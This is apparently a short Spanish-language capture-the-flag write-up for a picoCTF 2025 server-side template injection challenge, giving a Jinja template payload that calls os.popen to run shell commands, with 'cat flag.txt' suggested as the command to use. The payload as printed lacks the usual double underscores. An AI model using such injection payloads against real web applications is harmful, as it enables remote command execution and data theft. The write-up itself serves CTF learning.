### Descripcion
I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:56594/)!
### Solucion
Una SSTI es una Server Side Template Injection, que puede aprovecharse de una vulnerabilidad de difrentes motores como jinga, para hacer ejecucion de comandos

Este reto lo realice durante el evento de picoCTF2025, a continuacion paso el payload que permite la ejecucion de comandos

```python
{{ config.class.init.globals['os'].popen('id').read() }}
```
En la parte que dice id, va el comando que decea ejecutar, como esta vez, tenemos que leer una flag, solo tenemos que cambiar id por
cat flag.txt o el comando que deseamos ejecutar

### Tags
#stti